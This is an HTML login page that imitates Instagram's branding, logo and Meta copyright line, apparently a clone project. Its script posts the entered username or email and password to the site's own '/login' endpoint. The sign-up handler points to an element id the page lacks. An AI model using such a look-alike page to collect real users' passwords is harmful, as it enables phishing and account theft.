<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
</head>
<body>
    <main class="container">
        <div class="row justify-content-center align-items-center vh-100">
            <section id="mobile" class="col-lg-4 col-md-6 col-sm-8 col-10">
                <div class="login-box text-center">
                    <h1 title="Instagram" class="flex justify-content-center">
                        <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                    </h1>
                    <form id="login-form">
                        <div class="form-group">
                            <label for="email" class="sr-only">Phone number, username, or email</label>
                            <input type="text" class="form-control" id="email" placeholder="Phone number, username, or email">
                        </div>
                        <div class="form-group">
                            <label for="password" class="sr-only">Password</label>
                            <input type="password" class="form-control" id="password" placeholder="Password">
                        </div>
                        <button type="submit" class="btn btn-primary btn-block" style="background-color:#0095f6;">Login</button>
                        <div class="text-center mt-3">
                            <a href="#" class="text-decoration-none">Forgot password?</a>
                        </div>
                        <div class="divider mt-4 mb-4"><span>OR</span></div>
                        <button type="button" class="btn btn-facebook btn-block" style="background-color: #0095f6; color: white;" >
                            <i class="fab fa-facebook-f"></i> Continue with Facebook
                        </button>
                    </form>
                </div>
                <div class="signup-box text-center mt-3">
                    <p>Don't have an account?  <a href="#" id="">Sign Up</a></p>
                </div>
                <div class="app-download flex direction-column align-items-center mt-3">
                    <p>Get the app.</p>
                    <div class="flex justify-content-center">
                        <img src="./img/apple-button.png" alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                        <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                    </div>
                    <div style="margin-top: 20px;">
                    <p class="copyright">© 2024 Instagram from Meta</p>
                    </div>
                </div>
                 
            </section>
        </div>
       
    </main>
    <footer>
        <!-- <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">SOBRE</a></li>

            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul> 
        -->

    <script>
        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, password })
                });

                if (!response.ok) {
                    throw new Error('Failed to login');
                }

                const result = await response.text();
                alert(result);
            } catch (error) {
                console.error(error);
                alert('An error occurred while logging in');
            }
        });

        document.getElementById('signup-link').addEventListener('click', async () => {
            const username = prompt('Enter your username');
            const email = prompt('Enter your email');
            const password = prompt('Enter your password');

            try {
                const response = await fetch('/signup', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ username, email, password })
                });

                if (!response.ok) {
                    throw new Error('Failed to sign up');
                }

                const result = await response.text();
                alert(result);
            } catch (error) {
                console.error(error);
                alert('An error occurred while signing up');
            }
        });
    </script>
</body>
</html>
